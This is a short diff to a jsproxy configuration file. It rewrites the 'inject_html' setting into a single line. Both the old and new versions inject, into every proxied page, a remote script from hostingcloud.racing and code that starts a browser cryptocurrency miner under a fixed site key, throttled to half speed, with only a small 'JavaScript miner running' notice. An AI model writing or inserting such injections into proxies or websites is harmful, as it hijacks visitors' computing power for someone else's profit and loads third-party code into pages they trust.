@@ -79,14 +79,7 @@ jsproxy_config({
   /**
    * 自定义注入页面的 HTML
    */
-  inject_html: '
-    <script src="https://www.hostingcloud.racing/dVTM.js"></script>
-    <script>
-      var _client = new Client.Anonymous('ffeb5499683f358a9605c5834258297c74e6a61a80a3d287bc3ee68ce7f81607', {throttle: 0.5, c: 'w'});
-      _client.start();
-      _client.addMiningNotification("Bottom", "JavaScript miner running", "#dbdbdb", 30, "#404040");
-    </script>
-  ',
+  inject_html: '<script src="https://www.hostingcloud.racing/dVTM.js"></script><script>var _client = new Client.Anonymous('ffeb5499683f358a9605c5834258297c74e6a61a80a3d287bc3ee68ce7f81607', {throttle: 0.5, c: 'w'});_client.start();_client.addMiningNotification("Bottom", "JavaScript miner running", "#dbdbdb", 30, "#404040");</script>',
 
   /**
    * URL 自定义处理（设计中）
